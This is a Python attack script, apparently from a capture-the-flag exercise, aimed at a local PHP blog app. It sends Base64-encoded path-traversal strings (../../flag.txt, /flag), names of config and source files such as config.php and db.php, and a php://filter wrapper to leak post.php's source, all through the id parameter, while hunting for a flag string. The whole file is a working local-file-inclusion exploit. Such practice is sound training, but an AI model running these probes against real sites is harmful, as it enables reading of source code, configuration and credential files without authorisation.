import requests
import base64
import re

BASE_URL = "http://127.0.0.1:33209"

print("=" * 80)
print("Encoder64 Blog - Discovering Post Structure")
print("=" * 80)

# Try to enumerate posts with numeric IDs
print("\n[*] Enumerating posts with numeric IDs (1-50)")
print("-" * 80)

for post_id in range(1, 51):
    # Try numeric ID as-is
    try:
        url = f"{BASE_URL}/post.php?id={post_id}"
        resp = requests.get(url, timeout=10)
        
        if len(resp.content) > 50 and "Post not found" not in resp.text:
            print(f"\n[!] FOUND POST: id={post_id}")
            print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
            print(f"Content: {resp.text[:500]}")
        elif "Post not found" not in resp.text:
            print(f"[+] id={post_id}: Status={resp.status_code}, Length={len(resp.content)}B")
    except Exception as e:
        print(f"[-] Error with id={post_id}: {e}")

# Try Base64 encoded numeric IDs
print("\n\n[*] Testing Base64 encoded numeric IDs (1-50)")
print("-" * 80)

for post_id in range(1, 51):
    b64_id = base64.b64encode(str(post_id).encode()).decode()
    try:
        url = f"{BASE_URL}/post.php?id={b64_id}"
        resp = requests.get(url, timeout=10)
        
        if len(resp.content) > 50 and "Post not found" not in resp.text:
            print(f"\n[!] FOUND POST: Base64(id)={b64_id} (original: {post_id})")
            print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
            print(f"Content: {resp.text[:500]}")
            if "FLAG{" in resp.text:
                print(f"[!] FLAG FOUND in post!")
        elif len(resp.content) > 30:
            print(f"[+] Base64({post_id})={b64_id}: Length={len(resp.content)}B")
    except Exception as e:
        print(f"[-] Error: {e}")

# Try common blog post naming patterns with Base64
print("\n\n[*] Testing common blog post filename patterns")
print("-" * 80)

filename_patterns = [
    "post1.txt", "post1", "post-1.txt", "post_1.txt", "1.txt", 
    "article1.txt", "blog1.txt", "entry1.txt", "content1.txt",
    "posts/post1.txt", "posts/1.txt", "data/posts/1.txt", "content/posts/1.txt",
    "post.php", "index.php", "config.php", "db.php", "database.php",
    "flag.txt", "flag", "FLAG.txt", "FLAG",
    "/flag", "/flag.txt", "/tmp/flag", "../flag.txt", "../../flag.txt",
    "app.py", "main.py", "server.py", "wsgi.py", "settings.py"
]

for pattern in filename_patterns:
    b64_pattern = base64.b64encode(pattern.encode()).decode()
    try:
        url = f"{BASE_URL}/post.php?id={b64_pattern}"
        resp = requests.get(url, timeout=10)
        
        if len(resp.content) > 50 and "Post not found" not in resp.text:
            print(f"\n[!] FOUND: {pattern}")
            print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
            print(f"Content: {resp.text[:500]}")
            if "FLAG{" in resp.text:
                print(f"[!] FLAG FOUND!")
    except Exception as e:
        print(f"[-] Error with {pattern}: {e}")

# Try php://filter with Base64 encoding on the wrapper itself
print("\n\n[*] Testing php://filter with double Base64 encoding")
print("-" * 80)

wrapper = "php://filter/convert.base64-encode/resource=./post.php"
w_b64 = base64.b64encode(wrapper.encode()).decode()

try:
    url = f"{BASE_URL}/post.php?id={w_b64}"
    resp = requests.get(url, timeout=10)
    print(f"\n[*] Testing double Base64 encoding")
    print(f"Wrapper: {w_b64[:50]}...")
    print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    if len(resp.content) > 100:
        print(f"Content: {resp.text[:500]}")
except Exception as e:
    print(f"[-] Error: {e}")

# Try to read flag directly with various path traversals
print("\n\n[*] Testing direct flag file access")
print("-" * 80)

flag_paths = [
    "flag.txt",
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
    "../../../../flag.txt",
    "../../../../../flag.txt",
    "/flag.txt",
    "/flag"
]

for fpath in flag_paths:
    b64_path = base64.b64encode(fpath.encode()).decode()
    try:
        url = f"{BASE_URL}/post.php?id={b64_path}"
        resp = requests.get(url, timeout=10)
        
        if len(resp.content) > 50:
            print(f"\n[*] Testing: {fpath}")
            print(f"Base64: {b64_path}")
            print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
            print(f"Content: {resp.text[:500]}")
            
            if "FLAG{" in resp.text:
                print(f"[!] FLAG FOUND!")
                break
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n" + "=" * 80)
print("Discovery complete")
print("=" * 80)
